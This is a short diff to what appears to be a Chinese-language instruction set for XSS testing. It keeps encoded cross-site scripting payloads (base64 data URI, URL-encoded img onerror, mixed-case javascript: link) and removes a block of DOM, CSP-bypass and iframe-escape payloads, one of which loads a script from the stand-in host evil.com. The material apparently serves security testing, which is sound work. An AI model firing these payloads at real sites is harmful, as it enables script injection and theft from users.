@@ -18,11 +18,7 @@
   Base64:`data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg`
   URL编码:`%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E`
   混合编码:`<a href="jAvAsCrIpT:%61%6C%65%72%74(1)">`
-5.高级检测链[优先级4]：
-  •DOM型：`#<img src=x onerror=alert(location.hash.slice(1))>`
-  •CSP绕过：`<link rel=preload href='//evil.com/log' as=script>`
-  •框架逃逸：`<iframe srcdoc="<script>parent.alert(1)</script>">`
-6.结果验证：
+5.结果验证：
   - 通过页面内容来判断XSS Payload生效即可。
   - 如果 Payload 破坏了 DOM 或者标签结构，或者在 <script> 标签内可以生效，你就认为是可以执行的，不必拘泥于只有弹窗才算成功
 
